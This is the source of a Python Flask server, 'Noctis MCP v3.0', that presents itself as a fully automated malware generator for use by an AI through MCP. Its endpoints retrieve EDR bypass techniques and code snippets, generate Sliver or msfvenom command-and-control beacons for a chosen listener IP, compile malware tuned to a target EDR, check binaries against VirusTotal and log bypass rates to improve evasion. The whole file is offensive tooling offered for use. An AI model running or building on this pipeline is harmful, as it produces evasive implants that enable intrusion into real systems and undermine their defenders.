#!/usr/bin/env python3
"""
Noctis MCP v3.0 Server
Fully Automated Malware Generation with RAG
"""
import sys
import os
from pathlib import Path
from flask import Flask, request, jsonify
import logging

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))

# Setup logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Import modules
from server import edr_intel
from c2_adapters import sliver_adapter, msfvenom_adapter

# Try to import RAG (optional but recommended)
try:
    from server.rag.rag_engine import RAGEngine
    rag = RAGEngine()
    logger.info("[+] RAG engine loaded")
except Exception as e:
    rag = None
    logger.warning(f"[!] RAG not available: {e}")


@app.route('/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({
        "status": "healthy",
        "version": "3.0.0",
        "rag_enabled": rag is not None
    })


@app.route('/api/get_bypasses', methods=['POST'])
def get_bypasses():
    """Get EDR bypass techniques with code snippets"""
    data = request.json
    edr = data.get('edr', '')

    if not edr:
        return jsonify({"error": "edr required"}), 400

    # Get recommended techniques
    techniques = edr_intel.get_bypasses(edr)

    # Get code snippets from RAG
    snippets = []
    if rag:
        for tech in techniques:
            # Search RAG for this technique
            results = rag.search(f"{tech} implementation code", n_results=2)
            for result in results:
                content = result.get('content', result.get('document', ''))[:500]
                snippets.append(f"[{tech}]\n{content}...")

    return jsonify({
        "success": True,
        "edr": edr,
        "techniques": techniques,
        "snippets": snippets if snippets else ["RAG not available - AI will use technique names only"]
    })


@app.route('/api/generate_beacon', methods=['POST'])
def generate_beacon():
    """Generate C2 beacon with dynamic IP"""
    data = request.json
    c2_type = data.get('c2_type', 'sliver')
    listener_ip = data.get('listener_ip')
    listener_port = data.get('listener_port', 443)
    architecture = data.get('architecture', 'x64')

    if not listener_ip:
        return jsonify({"error": "listener_ip required"}), 400

    logger.info(f"[*] Generating {c2_type} beacon for {listener_ip}:{listener_port}")

    if c2_type == 'sliver':
        result = sliver_adapter.generate_beacon(listener_ip, listener_port, architecture)
    elif c2_type == 'msfvenom':
        result = msfvenom_adapter.generate_shellcode(listener_ip, listener_port, architecture)
    else:
        return jsonify({"error": f"Unknown c2_type: {c2_type}"}), 400

    return jsonify(result)


@app.route('/api/compile', methods=['POST'])
def compile_code():
    """Compile malware with auto-detected dependencies"""
    data = request.json
    source_file = data.get('source_file')
    target_edr = data.get('target_edr', 'generic')
    architecture = data.get('architecture', 'x64')

    if not source_file:
        return jsonify({"error": "source_file required"}), 400

    source_path = Path(source_file)
    if not source_path.exists():
        return jsonify({"error": f"File not found: {source_file}"}), 404

    logger.info(f"[*] Compiling {source_file} for {target_edr}/{architecture}")

    # Import compiler
    try:
        from compilation.compiler import compile_malware
        result = compile_malware(source_file, target_edr, architecture)
        return jsonify(result)
    except Exception as e:
        logger.error(f"[!] Compilation error: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route('/api/test_binary', methods=['POST'])
def test_binary():
    """Test binary on VirusTotal"""
    data = request.json
    binary_path = data.get('binary_path')
    target_edr = data.get('target_edr')

    if not binary_path:
        return jsonify({"error": "binary_path required"}), 400

    logger.info(f"[*] Testing {binary_path} against {target_edr}")

    # Check if VT is configured
    vt_api_key = os.getenv('VIRUSTOTAL_API_KEY')
    if not vt_api_key:
        return jsonify({
            "success": False,
            "error": "VirusTotal API key not configured",
            "hint": "Set VIRUSTOTAL_API_KEY in .env file"
        }), 503

    # Import VT tester
    try:
        from server.vt_tester import test_on_virustotal
        result = test_on_virustotal(binary_path, target_edr)
        return jsonify(result)
    except Exception as e:
        logger.error(f"[!] VT test error: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route('/api/record_result', methods=['POST'])
def record_result():
    """Record test result for learning"""
    data = request.json
    target_edr = data.get('target_edr')
    detected = data.get('detected', False)
    techniques = data.get('techniques', [])
    notes = data.get('notes', '')

    if not target_edr:
        return jsonify({"error": "target_edr required"}), 400

    logger.info(f"[*] Recording: {target_edr} - {'detected' if detected else 'bypassed'}")

    # Import learning tracker
    try:
        from server.learning_tracker import record_attack, get_stats
        record_attack(target_edr, techniques, detected, notes)
        stats = get_stats(target_edr)
        return jsonify({
            "success": True,
            "total_tests": stats['total'],
            "bypass_rate": stats['bypass_rate']
        })
    except Exception as e:
        logger.error(f"[!] Learning error: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


if __name__ == '__main__':
    print("\n" + "=" * 70)
    print("  NOCTIS MCP v3.0 - Fully Automated Malware Generator")
    print("=" * 70)
    print(f"  Server: http://localhost:8888")
    print(f"  RAG: {'Enabled' if rag else 'Disabled'}")
    print("=" * 70 + "\n")

    app.run(host='127.0.0.1', port=8888, debug=False)
